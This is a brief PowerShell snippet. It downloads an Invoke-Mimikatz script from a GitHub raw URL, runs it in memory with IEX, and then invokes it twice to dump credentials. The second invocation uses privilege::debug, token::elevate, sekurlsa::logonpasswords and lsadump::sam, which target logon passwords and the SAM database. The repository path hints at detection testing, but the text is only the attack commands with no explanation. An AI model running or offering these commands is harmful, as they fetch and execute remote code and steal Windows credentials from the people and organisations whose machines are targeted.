IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Pamentierx/DetectionDevelopment/main/WindowsTests/Invoke-Mimikatz.ps1') 

Invoke-Mimikatz -DumpCreds #Dump creds from memory

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
